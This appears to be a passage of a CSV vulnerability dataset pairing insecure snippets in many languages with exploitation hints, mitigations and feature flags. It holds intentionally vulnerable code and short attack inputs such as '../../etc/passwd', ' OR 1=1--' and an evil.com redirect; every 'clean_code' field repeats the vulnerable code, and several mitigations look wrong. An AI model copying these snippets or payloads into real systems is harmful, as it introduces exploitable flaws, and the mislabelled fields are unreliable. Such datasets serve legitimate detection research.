id,language,vulnerability_type,description,code_snippet,exploitation_techniques,mitigation,clean_code,has_user_input,has_db_operation,has_file_operation,has_eval,code_length,has_validation,has_quotes,has_concatenation,vuln_category,vul
vuln-085,Python,Insecure Session Cookies,Cookies without Secure/HttpOnly flags.,"response.set_cookie('session', session_id);",XSS to steal cookies or MITM for HTTP cookies.,"response.set_cookie('session', session_id, secure=True, httponly=True, samesite='Strict')","response.set_cookie('session', session_id);",False,False,False,False,43,False,True,False,Authentication,1
vuln-086,Python,Hardcoded Credentials,Credentials in source code.,"db.connect(user='admin', password='p@ssw0rd')",Code review or repo leak to extract creds.,"Use environment variables: os.getenv('DB_USER'), os.getenv('DB_PASS')","db.connect(user='admin', password='p@ssw0rd')",False,False,False,False,45,False,True,False,Other,1
vuln-087,Node.js,Insecure File Upload,No validation on uploaded files.,"fs.writeFileSync(`uploads/${req.files.file.name}`, req.files.file.data);","Upload shell.js with malicious code, execute via endpoint.","Validate MIME types, extensions. Store outside webroot.","fs.writeFileSync(`uploads/${req.files.file.name}`, req.files.file.data);",True,False,True,False,72,False,False,True,File_Handling,1
vuln-088,Node.js,Directory Traversal,User input in file paths.,"fs.readFileSync(path.join('public', req.query.file));",Input ../../etc/passwd to read files.,"path.resolve(baseDir, file); Check prefix matches baseDir.","fs.readFileSync(path.join('public', req.query.file));",True,True,True,False,53,False,True,False,Other,1
vuln-089,Ruby,Insecure Session Storage,Storing sensitive data in session without encryption.,session[:user_data] = { ssn: params[:ssn] },Steal session to access sensitive data.,"Encrypt: session[:user_data] = encrypt(params[:ssn], secret_key)",session[:user_data] = { ssn: params[:ssn] },True,False,False,False,43,False,False,False,Authentication,1
vuln-090,Ruby,Insecure Redirect,Unvalidated redirect URLs.,redirect_to params[:url],Redirect to malicious site: ?url=http://evil.com,Whitelist URLs: redirect_to(valid_urls.include?(url) ? url : '/'),redirect_to params[:url],True,False,False,False,24,False,False,False,Other,1
vuln-091,Go,Insecure Cookies,Cookies without secure flags.,"http.SetCookie(w, &http.Cookie{Name: ""session"", Value: id})",MITM or XSS to steal cookies.,"http.Cookie{Name: ""session"", Value: id, Secure: true, HttpOnly: true, SameSite: http.SameSiteStrictMode}","http.SetCookie(w, &http.Cookie{Name: ""session"", Value: id})",False,False,False,False,59,False,True,False,Other,1
vuln-092,Go,Hardcoded Secrets,API keys in code.,"client := NewClient(""sk_1234567890"")",Extract from repo or binary.,"Use os.Getenv(""API_KEY"")","client := NewClient(""sk_1234567890"")",False,False,False,False,36,False,True,False,Other,1
vuln-093,C# (.NET),Insecure File Access,User input in file paths.,"string path = Request.Query[""file""]; File.ReadAllText(path);",Access C:\Windows\system32\config\sam,"Validate: Path.Combine(baseDir, Path.GetFileName(path))","string path = Request.Query[""file""]; File.ReadAllText(path);",True,True,False,False,60,False,True,False,File_Handling,1
vuln-094,C# (.NET),Hardcoded Credentials,Embedded database credentials.,"var conn = new SqlConnection(""user=sa;password=secret"");",Extract from decompiled code.,"Use ConfigurationManager.AppSettings[""dbConn""]","var conn = new SqlConnection(""user=sa;password=secret"");",False,False,False,False,56,False,True,False,Other,1
vuln-095,Kotlin,Insecure File Access,Reading files with user input.,"val file = File(request.params[""file""]).readText()",../../etc/passwd,"File(baseDir, fileName).canonicalPath startsWith baseDir","val file = File(request.params[""file""]).readText()",True,False,False,False,50,False,True,False,File_Handling,1
vuln-096,Kotlin,Hardcoded Secrets,API keys in code.,"val api = ApiClient(""key-12345"")",Decompile APK or source leak.,"System.getenv(""API_KEY"")","val api = ApiClient(""key-12345"")",False,False,False,False,32,False,True,False,Other,1
vuln-097,Scala,Insecure Session,Session IDs not regenerated.,"session.put(""user"", username)",Session fixation via shared IDs.,"session.invalidate(); session.put(""user"", username)","session.put(""user"", username)",False,False,False,False,29,False,True,False,Authentication,1
vuln-098,Scala,SQL Injection,Raw SQL with user input.,"db.run(sql""SELECT * FROM users WHERE name = ${params(""name"")}"")",' OR 1=1--,Use slick: db.run(users.filter(_.name === name)),"db.run(sql""SELECT * FROM users WHERE name = ${params(""name"")}"")",True,True,False,False,63,False,True,True,Injection,1
vuln-099,Rust,Hardcoded Secrets,Credentials in source.,"let client = Client::new(""api_key_123"");",Extract from binary or repo.,"std::env::var(""API_KEY"")","let client = Client::new(""api_key_123"");",False,False,False,False,40,False,True,False,Other,1
vuln-100,Rust,Insecure File Access,Reading files with user input.,fs::read_to_string(&req.path).unwrap(),../../../etc/passwd,path.canonicalize() and check base dir.,fs::read_to_string(&req.path).unwrap(),True,False,False,False,38,False,False,False,File_Handling,1
vuln-101,Elixir,Insecure Redirect,Unvalidated redirect URLs.,"redirect conn, external: params[:url]",Redirect to http://malicious.com,"Whitelist: if Enum.member?(allowed_urls, url), do: redirect","redirect conn, external: params[:url]",True,False,False,False,37,False,False,False,Other,1
vuln-102,Elixir,Hardcoded Secrets,Credentials in config.,"config :app, key: ""secret123""",Source code exposure.,"Use System.get_env(""APP_KEY"")","config :app, key: ""secret123""",False,False,False,False,29,False,True,False,Other,1
vuln-103,Perl,Insecure File Access,Open with user input.,"open(my $fh, '<', $filename);",../../etc/passwd,Validate: die unless $filename =~ /^[a-z0-9]+$/;,"open(my $fh, '<', $filename);",False,False,True,False,29,False,True,False,File_Handling,1
vuln-104,Perl,Hardcoded Credentials,Credentials in script.,"my $dbh = DBI->connect(""dbi:mysql:db"", ""root"", ""pass123"");",Extract via source leak.,Use $ENV{DB_PASS},"my $dbh = DBI->connect(""dbi:mysql:db"", ""root"", ""pass123"");",False,False,False,False,58,False,True,False,Other,1
vuln-105,Node.js,Insecure Password Storage,Plaintext password storage.,"db.insert({ username, password: req.body.password });",Dump DB to access passwords.,"Use bcrypt: bcrypt.hashSync(password, 10)","db.insert({ username, password: req.body.password });",True,True,False,False,53,False,False,False,Other,1
vuln-106,Node.js,Insecure Randomness,Math.random for tokens.,const token = Math.random().toString(36);,Predictable tokens.,crypto.randomBytes(16).toString('hex'),const token = Math.random().toString(36);,False,False,False,False,41,False,False,False,Other,1
vuln-107,Python,Insecure Randomness,random module for crypto.,"import random; token = random.randint(100000, 999999)",Predict based on seed.,secrets.token_hex(16),"import random; token = random.randint(100000, 999999)",False,False,False,False,53,False,False,False,Other,1
vuln-108,Java,Insecure File Upload,No validation on uploads.,"Files.copy(file.getInputStream(), Paths.get(""uploads/"" + file.getName()));",Upload malicious.jar or .jsp.,"Validate content type, store outside webroot.","Files.copy(file.getInputStream(), Paths.get(""uploads/"" + file.getName()));",True,False,False,False,74,False,True,True,File_Handling,1
vuln-109,PHP,Insecure Randomness,rand() for tokens.,"$token = rand(100000, 999999);",Predictable output.,random_bytes(16); bin2hex($bytes),"$token = rand(100000, 999999);",False,False,False,False,30,False,False,False,Other,1
vuln-110,Ruby,Insecure File Upload,No file validation.,"File.write(""uploads/#{params[:file].original_filename}"", params[:file].read)",Upload malicious.rb.,"Validate content_type, use random names.","File.write(""uploads/#{params[:file].original_filename}"", params[:file].read)",True,False,False,False,76,False,True,False,File_Handling,1
vuln-111,Go,Insecure File Upload,No validation on uploads.,"os.WriteFile(""uploads/""+r.FormValue(""file""), data, 0644)",Upload executable .go.,"Check mime type, store securely.","os.WriteFile(""uploads/""+r.FormValue(""file""), data, 0644)",False,False,True,False,56,False,True,True,File_Handling,1
vuln-112,C# (.NET),Insecure Randomness,Random for crypto.,Random rand = new Random(); string token = rand.Next().ToString();,Predictable tokens.,RNGCryptoServiceProvider for random bytes.,Random rand = new Random(); string token = rand.Next().ToString();,False,False,False,False,66,False,False,False,Other,1
vuln-113,Kotlin,Insecure Randomness,Random() for tokens.,"val token = Random().nextInt(100000, 999999).toString()",Predictable sequence.,java.security.SecureRandom,"val token = Random().nextInt(100000, 999999).toString()",False,False,False,False,55,False,False,False,Other,1
vuln-114,Scala,Insecure Randomness,scala.util.Random for secrets.,val token = scala.util.Random.nextInt(1000000),Predictable tokens.,java.security.SecureRandom,val token = scala.util.Random.nextInt(1000000),False,False,False,False,46,False,False,False,Other,1
vuln-115,Rust,Insecure Randomness,rand::thread_rng for crypto.,use rand::Rng; let token = rand::thread_rng().gen_range(0..1000000);,Predictable output.,rand::crypto::SystemRandom,use rand::Rng; let token = rand::thread_rng().gen_range(0..1000000);,False,False,False,False,68,False,False,False,Other,1
vuln-116,Elixir,Insecure Randomness,:rand for tokens.,token = :rand.uniform(1000000),Predictable sequence.,:crypto.strong_rand_bytes(16) |> Base.encode16(),token = :rand.uniform(1000000),False,False,False,False,30,False,False,False,Other,1
vuln-117,Perl,Insecure Randomness,rand() for secrets.,my $token = int(rand(1000000));,Predictable tokens.,use Crypt::Random::Source qw(get_strong);,my $token = int(rand(1000000));,False,False,False,False,31,False,False,False,Other,1
vuln-118,Node.js,Rate Limiting Bypass,No rate limiting on API.,"app.post('/login', (req, res) => {...});",Brute force passwords.,Use express-rate-limit middleware.,"app.post('/login', (req, res) => {...});",False,False,False,False,40,False,True,False,Other,1
vuln-119,Python,Rate Limiting Bypass,No API rate limits.,"@app.route('/login', methods=['POST']) def login(): ...",Automate login attempts.,Use flask-limiter or redis-based limits.,"@app.route('/login', methods=['POST']) def login(): ...",False,False,False,False,55,False,True,False,Other,1
vuln-120,Java,Rate Limiting Bypass,No rate limits on endpoints.,"@PostMapping(""/login"") public Response login(@RequestBody User user) {...}",Brute force credentials.,Use Spring Security rate limiting or Guava RateLimiter.,"@PostMapping(""/login"") public Response login(@RequestBody User user) {...}",True,False,False,False,74,False,True,False,Other,1
vuln-121,PHP,Rate Limiting Bypass,No rate limiting on login.,if ($_POST['username'] && $_POST['password']) {...},Scripted brute force.,Implement Redis or session-based rate limiting.,if ($_POST['username'] && $_POST['password']) {...},False,False,False,False,51,False,True,False,Other,1
vuln-122,Ruby,Rate Limiting Bypass,No API rate limits.,post '/login' do ... end,Automate login attempts.,Use rack-attack gem.,post '/login' do ... end,False,False,False,False,24,False,True,False,Other,1
vuln-123,Go,Rate Limiting Bypass,No rate limits.,"http.HandleFunc(""/login"", loginHandler)",Brute force via scripts.,Use golang.org/x/time/rate,"http.HandleFunc(""/login"", loginHandler)",False,False,False,False,39,False,True,False,Other,1
vuln-124,C# (.NET),Rate Limiting Bypass,No API rate limits.,"[HttpPost(""login"")] public IActionResult Login(LoginModel model) {...}",Brute force credentials.,Use AspNetCoreRateLimit package.,"[HttpPost(""login"")] public IActionResult Login(LoginModel model) {...}",False,False,False,False,70,False,True,False,Other,1
vuln-125,Kotlin,Rate Limiting Bypass,No rate limits on endpoints.,"post(""/login"") { call.respond(login(call.request)) }",Brute force logins.,Use Ktor rate limiting middleware.,"post(""/login"") { call.respond(login(call.request)) }",False,False,False,False,52,False,True,False,Other,1
vuln-126,Scala,Rate Limiting Bypass,No rate limits.,"post(""/login"") { login(params) }",Brute force attempts.,Use Akka HTTP rate limiting.,"post(""/login"") { login(params) }",True,False,False,False,32,False,True,False,Other,1
vuln-127,Rust,Rate Limiting Bypass,No rate limits.,"router.post(""/login"", login);",Automate logins.,Use actix-web middleware for rate limiting.,"router.post(""/login"", login);",False,False,False,False,29,False,True,False,Other,1
vuln-128,Elixir,Rate Limiting Bypass,No rate limits on login.,"post ""/login"", LoginController, :create",Brute force.,Use PlugAttack or ExRated.,"post ""/login"", LoginController, :create",False,False,False,False,39,False,True,False,Other,1
vuln-129,Perl,Rate Limiting Bypass,No rate limits.,if ($r->method eq 'POST') { login($r->param('user')); },Scripted brute force.,Use Redis-based rate limiting.,if ($r->method eq 'POST') { login($r->param('user')); },True,False,False,False,55,False,True,False,Other,1
vuln-130,Node.js,Insecure JWT Handling,Weak secret or no validation.,"jwt.verify(token, 'weaksecret');",Crack weak secret or forge tokens.,Use strong secrets: crypto.randomBytes(64).toString('hex'),"jwt.verify(token, 'weaksecret');",False,False,False,False,32,False,True,False,Other,1
vuln-131,Python,Insecure JWT,Weak or no JWT secret.,"jwt.decode(token, 'secret', algorithms=['HS256'])",Brute force secret.,Use secrets.token_hex(32) for key.,"jwt.decode(token, 'secret', algorithms=['HS256'])",False,False,False,False,49,False,True,False,Other,1
vuln-132,Java,Insecure JWT,Weak JWT secret.,"JWTVerifier verifier = JWT.require(Algorithm.HMAC256(""secret"")).build();",Crack secret or forge token.,Generate strong key: new SecureRandom().generateKey(256),"JWTVerifier verifier = JWT.require(Algorithm.HMAC256(""secret"")).build();",False,False,False,False,72,False,True,False,Other,1
